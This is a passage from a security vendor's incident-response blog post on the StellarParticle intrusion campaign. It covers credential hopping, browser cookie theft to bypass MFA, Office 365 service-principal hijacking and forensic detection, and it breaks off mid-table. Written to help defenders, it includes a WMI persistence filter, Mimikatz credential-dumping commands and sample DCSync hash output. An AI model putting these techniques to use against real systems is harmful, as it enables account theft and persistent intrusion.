Armed with this information, CrowdStrike investigators were able to identify from which systems in these internal networks the threat actor was making authentications to O365.
These authentications would typically occur from servers in the environment, leading to natural investigative questions: Why would a user authenticate into O365 from a domain controller or other infrastructure server?
What credentials were used as part of the session from which the O365 authentication occurred? 
This led our responders to identify the occurrence of “credential hopping,” where the threat actor leveraged different credentials for each step while moving laterally through the victim’s network.
While this particular technique is not necessarily unique to the StellarParticle campaign, it indicates a more advanced threat actor and may go unnoticed by a victim. 
Below is an example of how a threat actor performs credential hopping: Gain access to the victim’s network by logging into a public-facing system via Secure Shell (SSH) using a local account <user sftp> acquired during previous credential theft activities. 
Use port forwarding capabilities built into SSH on the public-facing system to establish a Remote Desktop Protocol (RDP) session to an internal server (Server 1) using a domain service account. 
From Server 1, establish another RDP session to a different internal server (Server 2) using a domain administrator’s account. 
Log in to O365 as a user with privileged access to cloud resources. 
Figure 1.
Example of “credential hopping” technique This technique could be hard to identify in environments where defenders have little visibility into identity usage.
In the example shown in Figure 1, the threat actor leveraged a service interactively, which should generate detections for defenders to investigate.
However, the threat actor could have easily used a second domain administrator account or any other combination of accounts that would not be easily detected.
A solution such as CrowdStrike Falcon:registered: Identity Threat Detection would help identify these anomalous logons — and especially infrequent destinations for accounts.
(Read how CrowdStrike incident responders leverage the module in investigations in this blog: Credentials, Authentications and Hygiene: Supercharging Incident Response with Falcon Identity Threat Detection.) 
But how had the threat actor succeeded in authenticating into victim O365 tenants, when multifactor authentication (MFA) had been enabled for every O365 user account at each victim organization investigated by CrowdStrike? Cookie Theft to Bypass MFA Even though the victims required MFA to access cloud resources from all locations, including on premises, the threat actor managed to bypass MFA through the theft of Chrome browser cookies.
The threat actor accomplished this by using administrative accounts to connect via SMB to targeted users, and then copy their Chrome profile directories as well as data protection API (DPAPI) data.
In Windows, Chrome cookies and saved passwords are encrypted using DPAPI.
The user-specific encryption keys for DPAPI are stored under C:\Users\<user>\AppData\Roaming\Microsoft\Protect\. To leverage these encryption keys, the threat actor must first decrypt them, either by using the user account’s Windows password, or, in Active Directory environments, by using a DPAPI domain backup key that is stored on domain controllers. 
Once the threat actor had a Chrome cookies file from a user that had already passed an MFA challenge recently (for example, a timeout was 24 hours), they decrypted the cookies file using the user’s DPAPI key.
The cookies were then added to a new session using a “Cookie Editor” Chrome extension that the threat actor installed on victim systems and removed after using. 
Shellbags, Falcon Telemetry and RDP Bitmap Cache From a forensic standpoint, the use of the Cookie Editor Chrome extension would have been challenging to identify, due to the threat actor’s penchant for strict operational security.
This activity was identified via a NewScriptWritten event within Falcon when a JavaScript file was written to disk by a threat actor-initiated Chrome process.
This event captured the unique extension ID associated with the extension, thereby allowing CrowdStrike incident responders to validate via the Chrome Store that the JavaScript file was associated with the “Cookie Editor” plugin.
This extension permitted bypassing MFA requirements, as the cookies, replayed through the Cookie Editor extension, allowed the threat actor to hijack the already MFA-approved session of a targeted user. 
Shellbags were also instrumental in identifying the cookie theft activity.
This artifact very clearly showed the threat actor accessing targeted users’ machines in sequence and browsing to the Chrome and DPAPI directories one after another.
Parsing Shellbags for an administrative account leveraged by the threat actor resulted in entries similar to the below. 
Figure 2.
Shellbag artifacts showing targeting of Chrome directories CrowdStrike identified forensic evidence that showed the entire attack path: browsing to a target user’s Chrome and DPAPI directories via administrative share, installing the Cookie Editor extension, and using Chrome to impersonate the targeted user in the victim’s cloud tenants.
The decryption of the cookies is believed to have taken place offline after exfiltrating the data via the clipboard in the threat actor’s RDP session. 
Figure 3.
Representation of lateral movement to cookie theft to O365 authentication CrowdStrike identified a similar TTP where the threat actor connected via RDP to a user’s workstation with the workstation owner’s account (e.g., connecting via RDP to user1-pc using the account user1).
In cases where the user had only locked their screen and not signed out, the threat actor was able to take over the user’s Windows session, as the RDP session would connect to the existing session of the same user.
By examining RDP Bitmap Cache files, CrowdStrike was able to demonstrate that the threat actor had opened Chrome and exported all of the user’s saved passwords as plaintext in a CSV file during these sessions. 
Figure 4. RDP Bitmap Cache reconstruction showing exportation of Chrome passwords In addition, the threat actor visited sensitive websites that the user had access to, which in one instance allowed them to browse and download a victim’s customer list.
After this, the threat actor navigated to the user’s Chrome history page and deleted the specific history items related to threat actor activity, leaving the rest of the user’s Chrome history intact. 
O365 Delegated Administrator Abuse CrowdStrike also identified a connection between StellarParticle-related campaigns and the abuse of Microsoft Cloud Solution Partners’ O365 tenants.
This threat actor abused access to accounts in the Cloud Solution Partner’s environment with legitimate delegated administrative privileges to then gain access to several customers’ O365 environments. 
By analyzing Azure AD sign-ins, CrowdStrike was able to use known indicators of compromise (IOCs) to identify several threat actor logins to customer environments.
These cross-tenant sign-ins were identified by looking for values in the resourceTenantId attribute that did not match the Cloud Solution Partner’s own Azure tenant ID. 
CrowdStrike also identified a limitation within Microsoft’s Delegated Administration capabilities for Microsoft Cloud Solution Partners.
While a normal O365 administrator can be provided dozens of specific administrative roles to limit the privileges granted, this same degree of customization cannot be applied to Microsoft Cloud Solution Partners that use the delegated administrator functionality in O365. 
For Microsoft Cloud Solution Partners, there are only two substantial administrative options today when managing a customer’s environment, Admin agent or Helpdesk agent.2
The Helpdesk agent role provides very limited access that is equivalent to a password admin role, whereas the Admin agent role provides broad access more equivalent to global administrator.
This limitation is scheduled to be resolved in 2022 via Microsoft’s scheduled feature, Granular Delegated Admin Privileges (GDAP).3 User Access Logging (UAL) 
The Windows User Access Logging (UAL) database is an extremely powerful artifact that has played an instrumental role in the investigation of StellarParticle-linked cases.
In particular, UAL has helped our responders identify earlier malicious account usage that ultimately led to the identification of the aforementioned TrailBlazer implant and Linux version of the GoldMax variant. 
The UAL database is available by default on Server editions of Windows starting with Server 2012.
This database stores historical information on user access to various services (or in Windows parlance, Roles) on the server for up to three years (three years minus one day) by default.
UAL contains information on the type of service accessed, the user that accessed the service and the source IP address from which the access occurred.
One of the most useful roles recorded by UAL is the File Server role, which includes SMB access, though other role types can also be very helpful.
An overview of UAL, what information it contains and how it can be leveraged in forensic investigations can be found here. 
In multiple StellarParticle-related cases, because the threat actor used the same set of accounts during their operations in the environment, CrowdStrike was able to identify previous malicious activity going back multiple years, based solely on UAL data.
Even though it’s only available on Server 2012 and up, UAL can still be used to trace evidence of threat actor activity on legacy systems as long as the activity on the legacy system involves some (deliberate or unintentional) access to a 2012+ system.
For example, in addition to tracking SMB activity, UAL databases on Domain Controllers track Active Directory access. 
This allowed CrowdStrike to demonstrate that a given user account was also authenticating to Active Directory from a given source IP address two years prior.
Because the user account was known to have recently been abused by the threat actor, and the source IP of the system in question was not one that account would typically be active on, the investigation led to the source system and ultimately resulted in the timeline of malicious activity being pushed back by years, with additional compromised systems even being discovered still running unique malware from that time period. 
TrailBlazer and GoldMax Throughout StellarParticle-related investigations, CrowdStrike has identified two sophisticated malware families that were placed on victim systems in the mid-2019 timeframe: a Linux variant of GoldMax and a completely new family CrowdStrike refers to as TrailBlazer. 
TrailBlazer Attempted to blend in with a file name that matched the system name it resided on Configured for WMI persistence (generally uncommon in 2019) Used likely compromised infrastructure for C2 Masquerades its command-and-control (C2) traffic as legitimate Google Notifications HTTP requests TrailBlazer is a sophisticated malware family that provides modular functionality and a very low prevalence.
The malware shares high-level functionality with other malware families.
In particular, the use of random identifier strings for C2 operations and result codes, and attempts to hide C2 communications in seemingly legitimate web traffic, were previously observed tactics, techniques and procedures (TTPs) in GoldMax and SUNBURST.
TrailBlazer persists on a compromised host using WMI event subscriptions4 — a technique also used by SeaDuke — although this persistence mechanism is not exclusive to COZY BEAR.5 WMI event filter SELECT * FROM __
InstanceModificationEvent
WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime
>= 180 AND TargetInstance.
SystemUpTime < 480 WMI Event consumer (CommandLineTemplate) C:\Program Files (x86)\Common Files\Adobe\<FILENAME>.exe Filter to consumer binding CommandLineEventConsumer.
Name="<GUID1>"|__EventFilter.Name="<GUID2>" Table 1.
TrailBlazer WMI Persistence In the obfuscated example above, TrailBlazer (<FILENAME>.exe) would be executed when the system’s uptime was between 180 and 480 seconds. 
GoldMax (Linux variant) Attempted to blend in with a file name that matched the system name it resided on Configured for persistence via a crontab entry with a @reboot line Used likely compromised infrastructure for C2 GoldMax was first observed during post-exploitation activity in the campaign leveraging the SolarWinds supply chain attacks.
Previously identified samples of GoldMax were built for the Windows platform, with the earliest identified timestamp indicating a compilation in May 2020, but a recent CrowdStrike investigation discovered a GoldMax variant built for the Linux platform that the threat actor deployed in mid-2019.
This variant extends the backdoor’s known history and shows that the threat actor has used the malware in post-exploitation activity targeting other platforms than Windows. 
The 2019 Linux variant of the GoldMax backdoor is almost identical in functionality and implementation to the previously identified May 2020 Windows variant.
The very few additions to the backdoor between 2019 and 2020 likely reflect its maturity and longstanding evasion of detections.
It is likely GoldMax has been used as a long-term persistence backdoor during StellarParticle-related compromises, which would be consistent with the few changes made to the malware to modify existing functions or support additional functionality. 
Persistence was established via a crontab entry for a non-root user.
With the binary named to masquerade as a legitimate file on the system and placed in a hidden directory, a crontab entry was created with a @reboot line so the GoldMax binary would execute again upon system reboot.
Additionally, the threat actor used the nohup command to ignore any hangup signals, and the process will continue to run even if the terminal session was terminated. 
Figure 5.
Crontab entry for GoldMax persistence Enumeration Tools/Unique Directory Structure Throughout our StellarParticle investigations, CrowdStrike identified what appeared to be a VBScript-based Active Directory enumeration toolkit.
While the script’s contents have not been recovered to date, CrowdStrike has observed identical artifacts across multiple StellarParticle engagements that suggest the same or similar tool was used. 
In each instance the tool was used, Shellbags data indicated that directories with random names of a consistent length were navigated to by the same user that ran the tool.
After two levels of randomly named directories, Shellbags proved the existence of subdirectories named after the FQDNs for the victims’ various domains.
In addition, the randomly named directories are typically created in a previously existing directory that’s one level off of the root of the C drive.
The randomly named directories have a consistent length where the first directory is six characters and the next directory is three characters.
To date, the names of the directories have always been formed from lowercase alphanumeric characters.
For example, Shellbags indicated that directories matching the naming patterns below were browsed to (where “XX” is a previously existing directory on the system): C:\XX\[a-z0-9]{6} C:\XX\[a-z0-9]{6}\[a-z0-9]{3} C:\XX\[a-z0-9]{6}\[a-z0-9]{3}\domain.
FQDN C:\XX\[a-z0-9]{6}\[a-z0-9]{3}\domain-2.FQDN 
In each case, immediately prior to the creation of the directories referenced above, there was evidence of execution of a VBScript file by the same user that browsed to the directories.
This evidence typically came from a UserAssist entry for wscript.exe, as well as RecentApps entries for wscript.exe (that would also include the VBScript filename).
In addition, the Jump List for wscript.exe contained evidence of the VBScript files.
The name of the VBScript files varied across engagements and was generally designed to look fairly innocuous and blend in.
Two examples are env.vbs and WinNet.vbs.
Due to the subdirectories that are named after the FQDNs for victim domains, CrowdStrike assesses with moderate confidence that the scripts represent an AD enumeration tool used by the adversary. 
Internal Wiki Access Across multiple StellarParticle investigations, CrowdStrike identified unique reconnaissance activities performed by the threat actor: access of victims’ internal knowledge repositories.6 Wikis are commonly used across industries to facilitate knowledge sharing and as a source of reference for a variety of topics.
While operating in the victim’s internal network, the threat actor accessed sensitive information specific to the products and services that the victim organization provided.
This information included items such as product/service architecture and design documents, vulnerabilities and step-by-step instructions to perform various tasks.
Additionally, the threat actor viewed pages related to internal business operations such as development schedules and points of contact.
In some instances these points of contact were subsequently targeted for further data collection. 
The threat actor’s wiki access could be considered an extension of “Credential Hopping” described earlier.
The threat actor established RDP sessions to internal servers using privileged accounts and then accessed the wiki using a different set of credentials.
CrowdStrike observed the threat actor accessing the wiki as users who would be considered “non-privileged” from an Active Directory perspective but had access to sensitive data specific to the victim’s products or services. 
At this time, the malicious access of internal wikis is an information gathering technique that CrowdStrike has only observed in StellarParticle investigations.
CrowdStrike was able to identify the wiki access primarily through forensic analysis of the internal systems used by the threat actor.
Given the threat actor’s penchant for clearing browser data, organizations should not rely upon the availability of these artifacts for future investigations.
CrowdStrike recommends the following best practices for internal information repositories: Enable detailed access logging Ensure logs are centralized and stored for at least 180 days Create detections for anomalous activity such as access from an unusual location like a server subnet Enable MFA on the repository site, or provide access via Single Sign On (SSO) behind MFA O365 Built-in Service Principal Hijacking The threat actor connected via Remote Desktop from a Domain Controller to a vCenter server and opened a PowerShell console, then used the PowerShell command -ep bypass to circumvent the execution policy.
Using the Windows Azure Active Directory PowerShell Module, the threat actor connected to the victim’s O365 tenant and began performing enumeration queries.
These queries were recorded in text-based logs that existed under the path C:\Users\<user>\AppData\Local\Microsoft\Office365\Powershell\. Similar logs (for Azure AD instead of O365) can be found under the path: 
C:\Users\<user>\AppData\Local\Microsoft\AzureAD\Powershell\. While the logs didn’t include what data was returned by the queries, they did provide some insight such as the user account used to connect to the victim’s O365 tenant (which was not the same as the user the threat actor used to RDP to the vCenter server).
The logs contained commands issued and the count of the results returned for a specific command.
The commands included enumeration queries such as: ListAccountSkus ListPartnerContracts ListServicePrincipals ListServicePrincipalCredentials ListRoles ListRoleMembers ListUsers ListDomains GetRoleMember GetPartnerInformation GetCompanyInformation In this case, however, the most significant and concerning log entry was one that indicated the command AddServicePrincipalCredentials was executed.
By taking the timestamp that the command was executed via the PowerShell logs on the local system, CrowdStrike analyzed the configuration settings in the victim’s O365 tenant and discovered that a new secret had been added to a built-in Microsoft Azure AD Enterprise Application, Microsoft StaffHub Service Principal, which had Application level permissions.
Further, the newly added secret was set to remain valid for more than a decade.
This data was acquired by exporting the secrets and certificates details for each Azure AD Enterprise Application. 
The Service Principal (now renamed to Microsoft Teams Shifts) had the following permissions at the time the configuration settings were collected: Member.
Read Member.
Read.
All Member.
ReadWrite Member.
ReadWrite.
All Shift.
Read Shift.
ReadWrite Shift.
All Team.
Read Team.
ReadWrite Team.
All User.
All User.ReadWrite.
All WebHook.
All CrowdStrike was unable to find Microsoft documentation, but based on open-source research,7 this application likely had the following permissions around the time of registration: Mail.
Read Group.
All Files.
All Group.
All The most notable permissions above are the Mail.
Read, Files.
Read and Member.
ReadWrite permissions.
These permissions would allow the threat actor to use the Microsoft Staffhub service principal to read all mail and SharePoint/OneDrive files in the organization, as well as create new accounts and assign administrator privileges to any account in the organization. 
By running the commands from within the victim’s environment, MFA requirements were bypassed due to conditional access policies not covering Service Principal sign-ins at this point of time.8 However, as explained earlier, the threat actor managed to continue to access the victim’s cloud environment even when the victim enforced MFA for all connections regardless of source. 
While the bulk of the evidence for this activity came from the text-based O365 PowerShell logs, the NTUSER.DAT registry hive for the user that was running the PowerShell cmdlets also included information on the accounts that were used to authenticate to the cloud.
This information was stored under the registry path.
Below is an example of the registry data: Figure 6.
Example registry entry showing target O365 email accounts The same WSMan connection string was also located in the user’s NTUSER.DAT registry hive under the path: Figure 7.
WSMan connection string registry location While not strictly related to the O365 PowerShell activity, the Windows Event Log Microsoft-Windows-WinRM%4Operational.evtx also included information on connection attempts made to external O365 tenants.
This information was logged under Event ID 6.
Below is an example of what the event included: Figure 8.
Windows Event Log entry showing connection to O365 tenants O365 Company Service Principal Manipulation 
The threat actor also deployed several layers of persistence utilizing both pre-existing and threat actor-created Service Principals with the ultimate goal of gaining global access to email. 
Attacker-created Service Principal First, the threat actor used a compromised O365 administrator account to create a new Service Principal with a generic name.
This Service Principal was granted company administrator privileges.
From there, the threat actor added a credential to this Service Principal so that they could access the Service Principal directly, without use of an O365 user account. 
These actions were recorded in Unified Audit Logs with the following three operation names: Add service principal Add member to role Add service principal credentials. 
Update Service Principal Company-Created Service Principal Hijacking Next, the threat actor utilized the threat actor-created Service Principal to take control of a second Service Principal.
This was done by adding credentials to this second Service Principal, which was legitimately created by the company.
This now compromised company-created Service Principal had mail.read graph permissions consented on behalf of all users within the tenant. 
This action was recorded by just one operation type in Unified Audit Logs.
This operation type is named Add service principal credentials. 
Mail.
Read Service Principal Abuse Finally, the threat actor utilized the compromised Service Principal with the assigned mail.read permissions to then read emails of several different users in the company’s environment. 
CrowdStrike was able to use the Unified Audit Logs’ (UAL) MailItemsAccessed operation events to see the exact emails the threat actor viewed, as the majority of the users in the tenant were assigned O365 E5 licenses.
When performing analysis on the UAL, CrowdStrike used the ClientAppId value within the MailItemsAccessed operation and cross-correlated with the Application ID of the compromised service principal to see what activities were performed by the threat actor. 
O365 Application Impersonation Another consistent TTP identified during StellarParticle investigations has been the abuse of the ApplicationImpersonation9 role.
When this role was assigned to a particular user that was controlled by the threat actor, it allowed the threat actor to impersonate any user within the O365 environment.
These impersonated events are not logged verbosely by the Unified Audit Logs and can be difficult to detect. 
While the assignment of these ApplicationImpersonation roles were not logged in the Unified Audit Logs, CrowdStrike was able to identify this persistence mechanism via the management role configuration settings, which can be exported with the Exchange PowerShell command: Get-ManagementRoleAssignment -Role ApplicationImpersonation. 
CrowdStrike then analyzed the exported configuration settings and identified several users (not service accounts) that the threat actor likely gave direct ApplicationImpersonation roles during the known periods of compromise. 
Remote Tasklist The threat actor attempted to remotely list running processes on systems using tasklist.exe.
As tasklist uses WMI “under the hood,” this activity was captured by Falcon as SuspiciousWmiQuery events that included the query and the source system.
Additionally, the failed (not successful) process listing resulted in a DCOM error that was logged in the System.evtx event log under Event ID 10028.
A sample of the information included with this event is below: Figure 9.
Event ID 10028 showing failed execution of remote tasklist This remote process listing was consistently used by the threat actor targeting the same or similar lists of remote systems, and the owners of the targeted systems also happened to be the individuals with cloud access that the threat actor was interested in.
While unproven, it’s possible the threat actor was running tasklist remotely on these systems specifically to see which of the target systems was running Google Chrome.
This is because a current or recent Chrome session to the victim’s cloud tenants would be potentially beneficial in the hijacking of sessions that the threat actor performed in order to access the victim’s cloud resources. 
FTP Scanning/Identity Knowledge 
In one instance, after being evicted from a victim environment, the threat actor began probing external services as a means to regain access, initially focusing on (S)FTP servers that were internet-accessible.
Logs on the servers indicated that the threat actor attempted to log in with multiple valid accounts and in several cases was successful.
There was little to no activity during the (S)FTP sessions.
This likely was an exercise in attempting to identify misconfigured (S)FTP accounts that also had shell access, similar to what’s described in the Credential Hopping section earlier.
Some of the accounts used were not in the victim’s Active Directory, as these were accounts for customers of the victim and stored in a separate LDAP database.
However, the threat actor had knowledge of these accounts and used them on the correct systems, which further confirmed that the threat actor had advanced knowledge of the victim’s environment. 
After confirming the FTP accounts did not provide shell access into the environment, the threat actor began attempting to connect into the environment via VPN.
The threat actor attempted to log in to the VPN using several user accounts but was prevented from connecting, either due to not having the correct password, or due to having the correct password but not getting past the recently implemented MFA requirement.
Eventually, the threat actor attempted an account that they had the correct password for but that had not been set up with MFA.
This resulted in a prompt being displayed to the threat actor that included an MFA setup link.
The threat actor subsequently set up MFA for the account and successfully connected to the victim’s network via VPN. 
TA Masquerading of System Names During the attempted and successful VPN authentications described above, the threat actor ensured the hostname of their system matched the naming convention of hostnames in the victim’s environment.
This again showed a strong knowledge of the victim’s internal environment on the part of the threat actor.
Not only did the masqueraded hostnames follow the correct naming convention from a broad perspective, they were also valid in terms of what would be expected for the user account the threat actor leveraged (i.e., in terms of the site name and asset type indicated in the hostname).
This masqueraded hostname technique has been observed at multiple StellarParticle-related investigations. 
Credential Theft Using Get-ADReplAccount 
In one example, the threat actor connected into the victim’s environment via a VPN endpoint that did not have MFA enabled.
Once connected to the VPN, the threat actor connected via Remote Desktop to a Domain Controller and copied the DSInternals10 PowerShell module to the system.
The threat actor subsequently ran the DSInternals command Get-ADReplAccount targeting two of the victim’s domains.
This command uses the Microsoft Directory Replication Service (MS-DRSR) protocol and specifically the IDL_DRSGetNCChanges method to return account information from Active Directory such as the current NTLM password hashes and previous password hashes used for enforcing password reuse restrictions.
A common name for this particular technique is DCSync.11 An example output from Get-AdReplAccount is below: DistinguishedName: CN=TestUser,OU=Admins,OU=Users,DC=demo,DC=local Sid: S-1-5-21-1432446722-301123485-1266542393-2012 Guid: 12321930-7c05-4011-8a3e-e0b9b6e04567 SamAccountName: TestUser SamAccountType: User UserPrincipalName: TestUser@demo.local PrimaryGroupId: 513 SidHistory: Enabled: True UserAccountControl:
NormalAccount AdminCount: True Deleted: False LastLogonDate: 12/2/2021 1:41:46 PM DisplayName: TestUser GivenName: Test Surname: User Description: Admin Account ServicePrincipalName: SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, DiscretionaryAclProtected, SelfRelative Owner: S-1-5-21-1432446722-301123485-1266542393-512 Secrets NTHash: 84a058676bb6d7de4237e18f09b91156 LMHash: NTHashHistory: Hash 01: 84a058676bb6d7de4237e18f09b91156 Hash 02: e047ebb3b7c463928c928fca95ac0ac8 Hash 03: 6dc3cdb3e559ef00d3521351ace7477e Hash 04: a88355849f35fe7336de23a4ca3e6a9e Hash 05: de9bde95677672295349aa6e1e857704 LMHashHistory: 
Hash 01: 12227358dd7013c7dbdbd8fdcc0c6668 Hash 02: 6a028636a6f52491424586bb88357f7c Hash 03: c13ef7347853dc3be7e7259fdc8818a1 Hash 04: 6635151746869ce485246037747adae1 Hash 05: 85543f498b007e07a3da662c8a9d450b SupplementalCredentials: ClearText: 
NTLMStrongHash: de164e3465f163e846a5e1c22a5ac649 Kerberos: Credentials: DES_CBC_MD5 Key: 0013364f00003915 DES_CBC_CRC Key: 0013364f00003915 OldCredentials: DES_CBC_MD5 Key: 00002a46000004bc DES_CBC_CRC Key: 00002a46000004bc Salt: demo.localTestUser Flags: 0 KerberosNew: Credentials: AES256_CTS_HMAC_SHA1_96 Key: afd4d60e8d0920bc2f94d551f62f0ea2a17523bf2ff8ffb0fdade2a90389282f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: f67c2bcbfcfa30fccb36f72dca22a817 Iterations: 4096 DES_CBC_MD5 Key: 00002f34000004ee Iterations: 4096 DES_CBC_CRC Key: 00002f34000004ee Iterations: 4096 OldCredentials: AES256_CTS_HMAC_SHA1_96 Key: b430783ab4c957cf6a03d3d348af27264c0d872932650ffca712d9ebcf778b9f Iterations: 4096 AES128_CTS_HMAC_SHA1_96 Key: dc34bfd5e469edbeada77fac56aa35ae Iterations: 4096 DES_CBC_MD5 Key: 0000345400000520 Iterations: 4096 DES_CBC_CRC Key: 0000345400000520 Iterations: 4096 OlderCredentials: AES256_CTS_HMAC_SHA1_96 Key: 26efd3593712e555f8366bb4b8aff097d09acd93c3a1b6d4ea03c578aad9e087 Iterations:
4096 AES128_CTS_HMAC_SHA1_96 Key: c38dfbd6c00b5f3b010a07f9e824fc38 Iterations: 4096 DES_CBC_MD5 Key: 000039a500000551 Iterations: 4096 DES_CBC_CRC Key: 000039a500000551 Iterations: 4096 ServiceCredentials: Salt:
demo.localTestUser DefaultIterationCount: 4096 Flags: 0 WDigest: Hash 01: 83ed141ab0eaf1ff7694147ba97e1994 Hash 02: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 03: 0c228c5816a79e561d999d489499a12a Hash 04: 83ed141ab0eaf1ff7694147ba97e1994 Hash 05: e73a8c05d4a7df53774bfa7ef8f0f574 Hash 06: 4e7c5ec6ffb6100f0c7f0bc57749bc93 Hash 07: 83ed141ab0eaf1ff7694147ba97e1994 Hash 08: 10265b08a3bb710da516832eaf64368a Hash 09: 10265b08a3bb710da516832eaf64368a Key Credentials: Credential Roaming Created: Modified: Credentials: Figure 10.
Get-ADReplAccount example output When executing the Get-ADReplAccount command, the threat actor specified the AD context to be targeted via the NamingContext parameter.
This was necessary, as the threat actor was targeting multiple domains.
The resulting output of each command was redirected to a text file and compressed as zip archives before exfiltration. 
The fact that Get-ADReplAccount command includes not only the current NTLM hashes but also the hash history (i.e., hashes of previous passwords used by a user account) meant that the threat actor also had the ability to discover accounts that either reused the same passwords or used similar passwords when the account password was changed. 
Credential Refresh On some investigations, the dwell time of the threat actor spanned years.
Given this extended period, it is logical to assume that some credentials obtained by the threat actor would be rotated during normal business operations.
To combat this, the threat actor periodically “refreshed” their credential set by performing credential theft activities in an already compromised environment.
At one victim, CrowdStrike identified multiple instances of domain credential theft months apart, each time with a different credential theft technique. 
One of the credential theft techniques identified by CrowdStrike was the use of a PowerShell script to execute Mimikatz in-memory.
While in-memory Mimikatz is not particularly unique, the script executed by the threat actor was heavily obfuscated and encrypted the output using AES256.
CrowdStrike was able to reconstruct the PowerShell script from the PowerShell Operational event log as the script’s execution was logged automatically due to the use of specific keywords.
CrowdStrike recommends that organizations upgrade PowerShell on their systems, as this functionality is only available with PowerShell version 5 and above. 
In addition to refreshing the threat actor’s credentials, the threat actor would also refresh their understanding of the victim’s AD environment.
Around the time when the threat actor executed Get-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.
In this instance, AdFind was renamed to masquerade as a legitimate Windows binary.
The usage of renamed AdFind is consistent with other industry reporting on this campaign. 
In addition to using scripted commands, operators were repeatedly observed manually executing several standard PowerShell cmdlets to enumerate network information from AD, including Get-ADUser and Get-ADGroupMember to query specific members in the directory.
This information provided the adversary with a list of accounts possessing particular privileges — in this case, the ability to make VPN connections — that would be subject to later credential stealing attempts and leveraged to access the victim at a later time. 
Password Policies/Hygiene 
In some cases, the threat actor was able to quickly return to the environment and essentially pick up where they left off, even though the organization had performed an enterprise-wide password reset, including a reset of all service accounts and the double-reset of the krbtgt account.
CrowdStrike determined that in these cases, administrative users had “reset” their own password to the same password they previously used, essentially nullifying the impact of the enterprise-wide reset.
This was possible even though the customer’s Active Directory was configured to require new passwords to be different from the previous five passwords for a given account.
Unfortunately, this check only applies when a user is changing their password via the “password change” method — but if a “password reset” is performed (changing the password without knowing the previous password), this check is bypassed for an administrative user or a Windows account that has the Reset Password permission on a user’s account object.12 Since the Get-ADReplAccount cmdlet described above included the NTHashHistory values (i.e., previous password hashes) for user accounts, CrowdStrike was able to verify that some administrative accounts indeed had the exact same password hash showing up multiple times in the password history, as well as in the current NTHash value. 
Close Out The StellarParticle campaign, associated with the COZY BEAR adversary group, demonstrates this threat actor’s extensive knowledge of Windows and Linux operating systems, Microsoft Azure, O365, and Active Directory, and their patience and covert skill set to stay undetected for months — and in some cases, years. 
A special thank you to the CrowdStrike Incident Response and CrowdStrike Intelligence teams for helping make this blog possible, especially Ryan McCombs, Ian Barton, Patrick Bennet, Alex Parsons, Christopher Romano, Jackson Roussin and Tom Goldsmith. 
Endnotes https://us-cert.cisa.gov/sites/default/files/publications/CISA_Fact_Sheet-Russian_SVR_Activities_Related_to_SolarWinds_Compromise_508C.pdf https://docs.microsoft.com/en-us/partner-center/permissions-overview https://docs.microsoft.com/en-us/partner-center/announcements/2021-december#9 https://attack.mitre.org/techniques/T1546/003/ CrowdStrike Premium Intelligence Report https://attack.mitre.org/techniques/T1213/001/ https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/ https://docs.microsoft.com/en-us/azure/active-directory/conditional-access/block-legacy-authentication https://docs.microsoft.com/en-us/exchange/applicationimpersonation-role-exchange-2013-help https://github.com/MichaelGrafnetter/DSInternals https://attack.mitre.org/techniques/T1003/006/ https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/bbee5135-3db2-4824-873a-55104c3610ad MITRE ATT&CK Framework The following table maps TTPs covered in this article to the MITRE ATT&CK:registered: framework. 
Tactic Technique Observable Credential Access T1003.006 OS Credential Dumping: DCSync The threat actor obtained Active Directory credentials through domain replication protocols using the Get-ADReplAccount command from DSInternals Credential Access T1003.001: OS Credential Dumping: LSASS Memory The threat actor used a heavily obfuscated PowerShell script to execute the Mimikatz commands ‘privilege::debug sekurlsa::logonpasswords “lsadump::lsa /patch”‘ in-memory and encrypt the output Initial Access / Persistence T1078.003: Valid Accounts: Local Accounts A local account was used by the Threat Actor to establish a SSH tunnel into the internal network environment Initial Access / Persistence T1133:
External Remote Services The threat actor used VPNs to gain access to systems and persist in the environment Credential Access T1555.003: Credentials from Password Stores: Credentials from Web Browsers The threat actor exported saved passwords from user’s Chrome browser installations Credential Access T1539:
Steal Web Session Cookie The threat actor stole web session cookies from end user workstations and used them to access cloud resources Lateral Movement T1021.001:
Remote Services:
Remote Desktop Protocol The threat actor used both privileged and non-privileged accounts for RDP throughout the environment, depending on the target system Initial Access, Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor used accounts with Delegated Administrator rights to access other O365 tenants.
The Threat actor also used valid accounts to create persistence within the environment. 
Persistence T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription TrailBlazer was configured to execute after a reboot via a command-line event consumer Defense Evasion T1036.005:
Masquerading: Match Legitimate Name or Location The threat actor renamed their utilities to masquerade as legitimate system binaries (AdFind as svchost.exe), match the system’s role (GoldMax), or appear legitimate (TrailBlazer as an apparent Adobe utility).
Additionally, the threat actor renamed their systems prior to connecting to victim’s VPNs to match the victim’s system naming convention Discovery T1087.002: Account Discovery: Domain Account T1482: Domain Trust Discovery T1069.002: Permission Groups Discovery: Domain Groups The threat actor used AdFind, standard PowerShell cmdlets, and custom tooling to identify various pieces of information from Active Directory Defense Evasion / Lateral Movement T1550.001:
Use Alternate Authentication Material: Application Access Token The threat actor used compromised service principals to make changes to the Office 365 environment. 
Collection T1213.:
Data from Information Repositories: The threat actor accessed data from Information Repositories Persistence T1098.001:
Account Manipulation:
Additional Cloud Credentials The threat actor added credentials to O365 Service Principals Persistence T1078.004: Valid Accounts: Cloud Accounts The threat actor created new O365 Service Principals to maintain access to victim’s environments Discovery T1057: Process Discovery The threat actor regularly interrogated other systems using tasklist.exe Reconnaissance T1595.001:
